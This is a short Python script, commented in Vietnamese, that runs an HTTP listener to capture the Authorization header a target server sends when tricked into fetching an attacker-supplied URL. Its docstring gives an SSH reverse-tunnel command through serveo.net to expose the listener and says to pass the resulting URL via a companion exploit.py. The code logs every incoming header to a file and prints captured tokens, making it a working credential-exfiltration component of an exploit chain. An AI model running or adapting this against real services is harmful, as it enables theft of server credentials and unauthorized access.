"""Listener dung request fetch cua server de lay header Authorization.

Mot minh no khong tiep san duoc tu Internet, can hooc cong cong khai:

    ssh -R 80:localhost:8911 serveo.net      # in ra https://<hash>-<ip>.serveousercontent.com

Roi dem URL hooc cong do qua exploit.py. Log ghi day du headers vao analysis/auth.log,
mo rong ra moi lan chay de khong nham lan giua hai listener.

Chay: python analysis/catch_auth.py [port]
"""

import http.server
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8911
LOG = Path(__file__).with_name("auth.log")


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_GET(self):
        rec = {
            "t": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "method": self.command,
            "path": self.path,
            "headers": dict(self.headers),
        }
        with LOG.open("a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        auth = self.headers.get("authorization", "")
        print(f"[{rec['t']}] {self.command} {self.path} authorization={'(vac)' if not auth else auth[:24] + '...'}")
        # Body ngau nhien de thay doi dau ra cua /temperature, chung to server doc noi dung.
        payload = f"CLOUDY-{datetime.now(timezone.utc).timestamp()}".encode()
        self.send_response(200)
        self.send_header("content-type", "text/plain")
        self.send_header("content-length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    log_message = lambda *a: None


print(f"[*] lang nghe 0.0.0.0:{PORT}, log -> {LOG.name}")
http.server.ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
